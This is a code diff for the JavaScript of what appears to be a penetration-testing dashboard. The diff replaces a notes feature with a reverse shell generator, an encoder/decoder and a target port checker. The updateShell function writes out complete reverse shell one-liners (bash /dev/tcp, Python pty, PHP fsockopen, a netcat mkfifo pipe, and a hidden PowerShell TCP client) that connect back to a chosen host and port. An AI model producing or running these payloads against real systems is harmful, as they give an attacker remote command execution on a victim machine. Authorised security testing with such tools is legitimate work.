@@ -2,37 +2,28 @@ function updateStats() {
     fetch('/api/stats')
         .then(response => response.json())
         .then(data => {
-            // Update CPU
             const cpuText = document.getElementById('cpu-text');
             const cpuBar = document.getElementById('cpu-bar');
             if (cpuText && cpuBar) {
                 cpuText.innerText = data.cpu + '%';
                 cpuBar.style.width = data.cpu + '%';
             }
-
-            // Update RAM
             const ramText = document.getElementById('ram-text');
             const ramBar = document.getElementById('ram-bar');
             if (ramText && ramBar) {
                 ramText.innerText = data.ram + '%';
                 ramBar.style.width = data.ram + '%';
             }
-
-            // Update Disk
             const diskText = document.getElementById('disk-text');
             const diskBar = document.getElementById('disk-bar');
             if (diskText && diskBar) {
                 diskText.innerText = data.disk + '%';
                 diskBar.style.width = data.disk + '%';
             }
-
-            // Update Temp
             const tempText = document.getElementById('temp-text');
             if (tempText) {
                 tempText.innerText = data.temp !== "N/A" ? data.temp + '°C' : "N/A";
             }
-
-            // Update IP
             const ipText = document.getElementById('ip-text');
             if (ipText) {
                 ipText.innerText = data.ip;
@@ -41,118 +32,155 @@ function updateStats() {
         .catch(error => console.error('Error fetching stats:', error));
 }
 
-// Mission Notes Functionality
-function loadNotes() {
-    const notesList = document.getElementById('notes-list');
-    if (!notesList) return;
+// Reverse Shell Generator Logic
+function updateShell() {
+    console.log("Updating shell command...");
+    const lhostEl = document.getElementById('lhost');
+    const lportEl = document.getElementById('lport');
+    const typeEl = document.getElementById('shell-type');
+    const output = document.getElementById('shell-output');
 
-    fetch('/api/notes')
-        .then(response => response.json())
-        .then(data => {
-            notesList.innerHTML = '';
-            if (data.length === 0) {
-                notesList.innerHTML = '<p class="text-center opacity-50 py-3">No notes yet.</p>';
-                return;
-            }
+    if (!output || !lhostEl || !lportEl || !typeEl) return;
 
-            data.forEach(note => {
-                const noteEl = document.createElement('div');
-                noteEl.className = 'card bg-dark border-secondary mb-2 shadow-sm';
-                noteEl.innerHTML = `
-                    <div class="card-body p-2 d-flex justify-content-between align-items-start">
-                        <div style="white-space: pre-wrap; word-break: break-all;" class="small text-light me-2">${escapeHtml(note.content)}</div>
-                        <button class="btn btn-sm btn-outline-danger border-0 p-1" onclick="deleteNote('${note._id}')">
-                            <i class="fas fa-trash-alt"></i>
-                        </button>
-                    </div>
-                    <div class="card-footer p-1 bg-transparent border-0 text-end">
-                        <small class="text-muted" style="font-size: 0.7rem;">${new Date(note.created_at).toLocaleString()}</small>
-                    </div>
-                `;
-                notesList.appendChild(noteEl);
-            });
-        })
-        .catch(error => {
-            console.error('Error loading notes:', error);
-            notesList.innerHTML = '<p class="text-center text-danger py-3">Failed to load notes.</p>';
-        });
+    const lhost = lhostEl.value || '127.0.0.1';
+    const lport = lportEl.value || '4444';
+    const type = typeEl.value;
+
+    let command = '';
+    switch(type) {
+        case 'bash':
+            command = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
+            break;
+        case 'python':
+            command = `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`;
+            break;
+        case 'php':
+            command = `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/bash -i <&3 >&3 2>&3");'`;
+            break;
+        case 'nc':
+            command = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ${lhost} ${lport} >/tmp/f`;
+            break;
+        case 'ps':
+            command = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+            break;
+    }
+    output.innerText = command;
 }
 
-function escapeHtml(text) {
-    const div = document.createElement('div');
-    div.textContent = text;
-    return div.innerHTML;
-}
-
-function saveNotes() {
-    const notesArea = document.getElementById('mission-notes');
-    const saveBtn = document.getElementById('save-notes-btn');
-    const statusDiv = document.getElementById('save-status');
+// Encoder/Decoder Logic
+function handleCodec(action) {
+    console.log("Handling codec:", action);
+    const inputEl = document.getElementById('codec-input');
+    const outputEl = document.getElementById('codec-output');
     
-    if (!notesArea || !saveBtn || !notesArea.value.trim()) return;
+    if (!inputEl || !outputEl) return;
+    const input = inputEl.value;
+    
+    try {
+        if (action === 'b64-enc') outputEl.value = btoa(input);
+        else if (action === 'b64-dec') outputEl.value = atob(input);
+        else if (action === 'url-enc') outputEl.value = encodeURIComponent(input);
+        else if (action === 'url-dec') outputEl.value = decodeURIComponent(input);
+    } catch(e) {
+        outputEl.value = "Error: " + e.message;
+    }
+}
 
-    const originalText = saveBtn.innerHTML;
-    saveBtn.disabled = true;
-    saveBtn.innerHTML = '<i class="fas fa-spinner fa-spin me-1"></i> Adding...';
+// Target Status Logic
+function checkStatus() {
+    console.log("Checking target status...");
+    const targetEl = document.getElementById('target-ip');
+    const portEl = document.getElementById('target-port');
+    const btn = document.getElementById('check-btn');
+    const results = document.getElementById('status-results');
 
-    fetch('/api/notes', {
+    if (!targetEl || !results || !btn) return;
+    const target = targetEl.value;
+    const port = portEl.value || 80;
+
+    if (!target) {
+        alert("Please enter a target IP or hostname");
+        return;
+    }
+
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner-border spinner-border-sm"></span>';
+
+    fetch('/api/target_check', {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ content: notesArea.value }),
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ target, port })
     })
-    .then(response => response.json())
+    .then(r => r.json())
     .then(data => {
-        if (data.status === 'success') {
-            notesArea.value = '';
-            loadNotes();
-            statusDiv.innerText = 'Note added!';
-            statusDiv.className = 'small mt-1 text-success';
-            statusDiv.style.display = 'block';
-            setTimeout(() => {
-                statusDiv.style.display = 'none';
-            }, 2000);
+        if (results.innerHTML.includes('No targets checked')) {
+            results.innerHTML = '';
         }
+        
+        const time = new Date().toLocaleTimeString();
+        const statusClass = data.open ? 'text-success' : 'text-danger';
+        const statusIcon = data.open ? 'fa-check-circle' : 'fa-times-circle';
+        
+        const item = document.createElement('div');
+        item.className = 'list-group-item bg-transparent border-secondary text-light d-flex justify-content-between align-items-center px-0';
+        item.innerHTML = `
+            <div>
+                <span class="fw-bold text-light">${data.target}:${data.port}</span>
+                <small class="opacity-50 ms-2 text-muted">${time}</small>
+            </div>
+            <span class="${statusClass} fw-bold">
+                <i class="fas ${statusIcon} me-1"></i>${data.open ? 'OPEN' : 'CLOSED'}
+            </span>
+        `;
+        results.prepend(item);
     })
-    .catch(error => {
-        console.error('Error saving note:', error);
-        statusDiv.innerText = 'Error adding note.';
-        statusDiv.className = 'small mt-1 text-danger';
-        statusDiv.style.display = 'block';
+    .catch(err => {
+        console.error("Check status error:", err);
+        alert("Error: " + err);
     })
     .finally(() => {
-        saveBtn.disabled = false;
-        saveBtn.innerHTML = originalText;
+        btn.disabled = false;
+        btn.innerText = 'Check';
     });
 }
 
-function deleteNote(noteId) {
-    if (!confirm('Are you sure you want to delete this note?')) return;
-
-    fetch(`/api/notes/${noteId}`, {
-        method: 'DELETE',
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.status === 'success') {
-            loadNotes();
+function copyToClipboard(elementId) {
+    const el = document.getElementById(elementId);
+    if (!el) return;
+    const text = el.tagName === 'TEXTAREA' ? el.value : el.innerText;
+    navigator.clipboard.writeText(text).then(() => {
+        const originalText = el.innerText;
+        // Visual feedback
+        if (el.tagName !== 'TEXTAREA') {
+            const originalColor = el.style.color;
+            el.style.color = '#3fb950';
+            setTimeout(() => el.style.color = originalColor, 500);
         }
-    })
-    .catch(error => console.error('Error deleting note:', error));
+    });
 }
 
-// Initial call
-if (document.getElementById('cpu-text')) {
-    updateStats();
-    // Update every 3 seconds
-    setInterval(updateStats, 3000);
-}
-
-// Event listeners for notes
+// Initial Setup
 document.addEventListener('DOMContentLoaded', () => {
-    if (document.getElementById('mission-notes')) {
-        loadNotes();
-        document.getElementById('save-notes-btn').addEventListener('click', saveNotes);
+    console.log("JS Loaded and DOM Ready");
+    
+    // Stats interval
+    if (document.getElementById('cpu-text')) {
+        updateStats();
+        setInterval(updateStats, 3000);
+    }
+
+    // Shell Gen Listeners
+    const shellInputs = ['lhost', 'lport', 'shell-type'];
+    shellInputs.forEach(id => {
+        const el = document.getElementById(id);
+        if (el) {
+            el.addEventListener('input', updateShell);
+            el.addEventListener('change', updateShell);
+        }
+    });
+    
+    // Initialize shell output
+    if (document.getElementById('shell-output')) {
+        updateShell();
     }
 });
